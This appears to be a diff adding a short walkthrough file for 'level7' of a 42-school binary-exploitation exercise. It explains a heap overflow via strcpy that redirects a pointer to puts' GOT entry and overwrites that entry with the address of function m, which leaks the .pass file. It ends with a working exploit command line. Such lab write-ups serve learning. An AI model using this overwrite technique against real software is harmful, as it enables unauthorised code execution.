@@ -1,0 +1,29 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2021/04/24 17:50:16 by fcadet            #+#    #+#              #
+#    Updated: 2021/04/24 18:57:54 by fcadet           ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+- .pass file content is stored into global variable c
+- we can substitute puts address in GOT by m address in order to print that value
+
+- a[1] and b[1] contains addresses of allocated spaces in wich argv[1] and arg[2]
+will be written using strcpy
+- so we can set address in b[1], by overflowing *a[1], to puts function GOT entry
+address and write argv[2] (m address) in it
+
+- thanks to ltrace we find *a[1] @ 0x0804a018 and b[1] @ 0x0804a028 + 0x4
+- so we have to write (0x0804a028 + 0x4 - 0x0804a018) 20 bytes in argv[1] to reach
+b[1] and override it with GOT entry
+- we can then put m address in argv[2] to override the entry
+
+- objdump -R shows the GOT entry address of puts @ 0x08049928
+- with gdb we see m @ 0x080484f4
+- let's build our exploit command
+	- ./level7 $(ruby -e 'print "x" * 20 + "\x28\x99\x04\x08" + " \xf4\x84\x04\x08"')
